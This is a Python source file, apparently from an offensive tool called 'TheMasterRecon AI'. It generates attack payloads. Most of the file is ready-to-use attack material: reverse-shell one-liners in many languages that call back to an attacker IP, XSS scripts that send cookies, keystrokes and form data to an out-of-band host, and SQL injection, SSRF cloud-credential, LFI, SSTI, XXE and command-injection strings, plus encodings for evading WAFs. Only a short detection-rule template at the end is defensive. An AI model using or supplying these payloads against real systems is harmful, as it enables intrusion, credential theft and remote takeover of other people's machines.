"""
TheMasterRecon AI — Payload Generator (msfvenom-style)
Generate PoC payloads, reverse shells, escalation chains.
"""
import base64, urllib.parse, re, logging, json
from typing import Optional

log = logging.getLogger("elite.payload_gen")

# Reverse shell templates
REVSHELLS = {
    "bash":      "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash_b64":  "bash -c {{echo,{b64}}}|{{base64,-d}}|bash",
    "python3":   "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python2":   "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "nc":        "nc -e /bin/sh {ip} {port}",
    "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "perl":      "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "php":       "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "powershell":"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    "ruby":      "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "java":      "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()",
    "awk":       "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print |& s; close(c)}} }} while(c != \"exit\") }}}}'",
    "socat":     "socat TCP:{ip}:{port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane",
    "nodejs":    "(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({port},\"{ip}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/}})();",
}

XSS_PAYLOADS = {
    "basic":       "<script>alert(document.domain)</script>",
    "steal_cookie":"<script>document.location='https://OOBHOST/c?'+document.cookie</script>",
    "steal_ls":    "<script>document.location='https://OOBHOST/ls?'+btoa(JSON.stringify(localStorage))</script>",
    "keylogger":   "<script>document.onkeypress=function(e){new Image().src='https://OOBHOST/k?k='+e.key}</script>",
    "form_steal":  "<script>document.forms[0].addEventListener('submit',function(e){fetch('https://OOBHOST/form?'+new URLSearchParams(new FormData(e.target)).toString())})</script>",
    "csrf_get":    "<script>fetch('https://TARGET/api/change-password?password=hacked123')</script>",
    "csrf_post":   "<script>fetch('https://TARGET/api/change-email',{method:'POST',body:JSON.stringify({email:'attacker@evil.com'}),headers:{'Content-Type':'application/json'},credentials:'include'})</script>",
    "svg":         "<svg onload='alert(document.domain)'>",
    "img_onerror": "<img src=x onerror='alert(1)'>",
    "iframe":      "<iframe src='javascript:alert(document.domain)'>",
    "polyglot":    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
}

SQLI_PAYLOADS = {
    "detect_mysql":  "' AND SLEEP(5)-- -",
    "detect_mssql":  "'; WAITFOR DELAY '0:0:5'--",
    "detect_oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "detect_postgres":"' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    "union_mysql":   "' UNION SELECT NULL,NULL,NULL,NULL--",
    "dump_tables":   "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "dump_users":    "' UNION SELECT user,password FROM mysql.user--",
    "error_based":   "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
    "blind_true":    "' AND 1=1--",
    "blind_false":   "' AND 1=2--",
    "stacked":       "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--",
    "oob":           "'; LOAD_FILE(concat('\\\\\\\\',database(),'.OOBHOST\\\\a'))--",
}

SSRF_PAYLOADS = {
    "aws_meta":     "http://169.254.169.254/latest/meta-data/",
    "aws_creds":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata": "http://169.254.169.254/latest/user-data",
    "gcp_meta":     "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "azure_meta":   "http://169.254.169.254/metadata/instance?api-version=2021-01-01",
    "localhost":    "http://127.0.0.1:80/admin",
    "internal":     "http://internal.corp/",
    "file_read":    "file:///etc/passwd",
    "gopher_smtp":  "gopher://127.0.0.1:25/",
    "gopher_redis": "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A",
    "dns_rebind":   "http://OOBHOST.burpcollaborator.net/",
    "ipv6":         "http://[::1]/admin",
    "decimal_ip":   "http://2130706433/admin",  # 127.0.0.1
    "octal_ip":     "http://0177.0.0.1/admin",
}

ENCODINGS = {
    "url":        lambda s: urllib.parse.quote(s),
    "double_url": lambda s: urllib.parse.quote(urllib.parse.quote(s)),
    "html":       lambda s: "".join(f"&#{ord(c)};" for c in s),
    "unicode":    lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
    "base64":     lambda s: base64.b64encode(s.encode()).decode(),
    "hex":        lambda s: "".join(f"\\x{ord(c):02x}" for c in s),
    "null_byte":  lambda s: s + "\x00",
    "case_mixed": lambda s: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(s)),
}


def gen_revshell(ip: str, port: int, shell_type: str = "bash") -> dict:
    """Generate reverse shell payload for given IP:PORT."""
    results = {}
    b64_bash = base64.b64encode(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode()).decode()
    
    if shell_type == "all":
        for name, tmpl in REVSHELLS.items():
            try:
                results[name] = tmpl.format(ip=ip, port=port, b64=b64_bash)
            except Exception:
                results[name] = tmpl
    else:
        tmpl = REVSHELLS.get(shell_type, REVSHELLS["bash"])
        results[shell_type] = tmpl.format(ip=ip, port=port, b64=b64_bash)
        # Also generate one-liner listener
        results["listener"] = f"nc -lvnp {port}"
        results["listener_rlwrap"] = f"rlwrap nc -lvnp {port}"

    return results


def gen_payload(bug_type: str, target_url: str = "", param: str = "",
                oob_host: str = "OOBHOST", encoding: str = "none") -> dict:
    """Generate targeted payloads for a bug type."""
    payloads_map = {
        "xss":    XSS_PAYLOADS,
        "sqli":   SQLI_PAYLOADS,
        "ssrf":   SSRF_PAYLOADS,
        "lfi":    {k:v for k,v in enumerate(
                    ["../../../etc/passwd","../../../../etc/shadow",
                     "php://filter/convert.base64-encode/resource=index.php",
                     "php://input","expect://id","/proc/self/environ"])},
        "ssti":   {"jinja2_detect":"{{7*7}}","jinja2_rce":"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                   "twig":"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                   "freemarker":"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"},
        "xxe":    {"basic":'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                   "oob":f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob_host}/xxe.dtd">%xxe;]>',
                   "error":'<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://oob/?%file;\'>">%eval;%exfil;]>'},
        "rce":    {"bash":"; id","pipe":"| id","backtick":"`id`","dollar":"$(id)",
                   "windows":"& whoami","newline":"%0aid","sleep":"; sleep 5",
                   "oob":f"; curl http://{oob_host}/rce"},
    }

    raw_payloads = payloads_map.get(bug_type, {})
    if not raw_payloads:
        return {"error":f"No payloads for bug type: {bug_type}"}

    # Apply OOB substitution
    result = {}
    for name, payload in raw_payloads.items():
        p = str(payload).replace("OOBHOST", oob_host).replace("TARGET", target_url)
        # Apply encoding
        if encoding != "none" and encoding in ENCODINGS:
            try: p = ENCODINGS[encoding](p)
            except Exception: pass
        result[str(name)] = p

    # Generate WAF bypass variants for the first payload
    if raw_payloads:
        first = str(list(raw_payloads.values())[0]).replace("OOBHOST", oob_host)
        bypass_variants = {}
        for enc_name, enc_fn in list(ENCODINGS.items())[:4]:
            try: bypass_variants[enc_name] = enc_fn(first)
            except Exception: pass
        result["_waf_bypass_variants"] = bypass_variants

    return result


def gen_custom_rule(pattern: str, name: str, severity: str = "medium",
                    description: str = "") -> dict:
    """Generate a custom detection rule in YAML template format."""
    return {
        "id":          f"custom-{name.lower().replace(' ','-')}",
        "name":        name,
        "severity":    severity,
        "description": description or f"Custom detection for: {pattern}",
        "pattern":     pattern,
        "yaml": f"""id: custom-{name.lower().replace(' ', '-')}
info:
  name: {name}
  author: TheMasterRecon AI
  severity: {severity}
  description: {description or 'Custom rule'}

requests:
  - method: GET
    path:
      - "{{{{BaseURL}}}}"
    matchers:
      - type: regex
        regex:
          - {json.dumps(pattern)}
"""
    }
